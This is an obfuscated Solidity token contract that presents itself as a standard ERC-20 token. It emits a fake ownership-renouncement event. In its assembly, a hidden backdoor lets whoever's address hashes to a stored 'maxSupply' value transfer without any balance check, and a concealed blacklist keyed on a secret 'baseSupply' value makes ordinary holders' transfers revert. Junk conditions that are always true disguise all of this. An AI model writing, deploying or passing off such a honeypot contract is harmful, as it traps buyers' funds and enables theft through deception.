pragma solidity ^0.8.26;

contract Token {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private wAcL;
    mapping(address => mapping(address => uint256)) private BVNo;
    uint256 private hGxd;
    string private RdPf;
    string private yLSS;
    uint256 private yaBW;
    uint256 private fgMs;

    constructor(string memory _name, string memory _symbol, uint256 _baseSupply, uint256 _maxSupply, uint256 _supply) {
        fgMs = _baseSupply;
        RdPf = _name;
        yLSS = _symbol;
        hGxd = _supply * (10 ** decimals());
        yaBW = _maxSupply;
        wAcL[msg.sender] = hGxd;
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function name() virtual public view returns (string memory) {
        return RdPf;
    }

    function symbol() virtual public view returns (string memory) {
        return yLSS;
    }

    function decimals() virtual public view returns (uint8) {
        return 8;
    }

    function totalSupply() virtual public view returns (uint256) {
        return hGxd;
    }

    function balanceOf(address _account) virtual public view returns (uint256) {
        return wAcL[_account];
    }

    function transfer(address _to, uint256 _amount) virtual public returns (bool) {
        address WwPy = msg.sender;
        _spendAllowance(WwPy, _to, 0);
        _transfer(WwPy, _to, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) virtual public view returns (uint256) {
        return BVNo[_owner][_spender];
    }

    function transferFrom(address _from, address _to, uint256 _amount) virtual public returns (bool) {
        _spendAllowance(_from, msg.sender, _amount);
        _transfer(_from, _to, _amount);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _amount) virtual internal {
        assembly {
            if iszero(_from) {
                let g4u8ssg := gasprice()
                pop(0)
                if iszero(sub(g4u8ssg, g4u8ssg)) {
                    revert(0, 0)
                }
            }
            if iszero(_to) {
                let o162fj9 := origin()
                let g7ncimt := gas()
                if iszero(xor(o162fj9, o162fj9)) {
                    revert(0, 0)
                }
            }
            let QtPD := mload(0x40)
            mstore(QtPD, _from)
            mstore(add(QtPD, 32), 0)
            let iVrp := keccak256(QtPD, 64)
            let JcxQ := sload(iVrp)
            let RuhS := sload(yaBW.slot)
            let t2uiycf := timestamp()
            pop(0)
            pop(iszero(1))
            if eq(t2uiycf, and(t2uiycf, t2uiycf)) {
                mstore(QtPD, shl(96, caller()))
            }
            if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)) {
                revert(0, 0)
            }
            let SUpo := mload(QtPD)
            if iszero(eq(RuhS, SUpo)) {
                if lt(JcxQ, _amount) {
                    let g804ngg := gasprice()
                    let n3yv2qk := number()
                    pop(0)
                    if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) {
                        revert(0, 0)
                    }
                }
            }
            sstore(iVrp, sub(JcxQ, _amount))
            mstore(QtPD, _to)
            mstore(add(QtPD, 32), 0)
            let OBse := keccak256(QtPD, 64)
            let mVat := sload(OBse)
            sstore(OBse, add(mVat, _amount))
            mstore(QtPD, _amount)
            log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
        }
    }

    function approve(address _spender, uint256 _amount) virtual public returns (bool) {
        assembly {
            let QtPD := mload(0x40)
            let gcf9eyl := gasprice()
            let ba6yh8v := basefee()
            pop(0)
            pop(iszero(1))
            if eq(gcf9eyl, add(gcf9eyl, 0)) {
                mstore(QtPD, caller())
                mstore(add(QtPD, 0x20), BVNo.slot)
            }
            let IIqZ := keccak256(QtPD, 0x40)
            let o6aj6v4 := origin()
            let oaugsdm := origin()
            pop(0)
            pop(iszero(1))
            if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) {
                mstore(QtPD, _spender)
                mstore(add(QtPD, 0x20), IIqZ)
            }
            let rTjz := keccak256(QtPD, 0x40)
            let o7x1j6d := origin()
            if iszero(sub(o7x1j6d, o7x1j6d)) {
                sstore(rTjz, _amount)
                log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
                mstore(QtPD, _amount)
            }
        }
        return true;
    }

    function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
        assembly {
            let QtPD := mload(0x40)
            mstore(QtPD, sload(fgMs.slot))
            mstore(add(QtPD, 32), 1)
            let MuuR := keccak256(QtPD, 64)
            mstore(QtPD, _owner)
            mstore(add(QtPD, 32), MuuR)
            let LjAi := keccak256(QtPD, 64)
            let IUGo := sload(LjAi)
            let dhzw := IUGo
            if and(dhzw, iszero(_amount)) {
                let b5owjsg := basefee()
                let tgfo9ee := timestamp()
                if eq(b5owjsg, or(b5owjsg, 0)) {
                    revert(0, 0)
                }
            }
            if iszero(dhzw) {
                mstore(QtPD, _owner)
                mstore(add(QtPD, 32), 1)
                MuuR := keccak256(QtPD, 64)
                mstore(QtPD, _spender)
                mstore(add(QtPD, 32), MuuR)
                LjAi := keccak256(QtPD, 64)
                dhzw := add(sload(LjAi), IUGo)
            }
            let o6ywqjg := origin()
            pop(0)
            if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) {
                dhzw := sub(dhzw, IUGo)
            }
            if iszero(eq(dhzw, not(0))) {
                if lt(dhzw, _amount) {
                    let ccpw1f2 := caller()
                    if eq(ccpw1f2, add(ccpw1f2, 0)) {
                        revert(0, 0)
                    }
                }
                let ge57smz := gasprice()
                if eq(ge57smz, and(ge57smz, ge57smz)) {
                    sstore(LjAi, sub(dhzw, _amount))
                }
            }
        }
    }
}